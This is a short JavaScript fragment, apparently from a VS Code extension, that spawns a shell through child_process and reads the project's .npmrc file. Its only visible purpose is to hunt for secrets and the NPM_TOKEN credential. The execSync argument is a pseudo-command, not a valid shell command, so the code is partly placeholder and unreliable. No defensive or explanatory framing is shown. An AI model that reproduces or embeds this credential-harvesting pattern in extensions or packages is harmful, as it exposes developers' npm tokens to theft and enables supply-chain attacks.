const vscode = require('vscode');
const cp = require('child_process');
cp.execSync('enumerate files; search for secrets; NPM_TOKEN');
const data = require('fs').readFileSync('.npmrc');
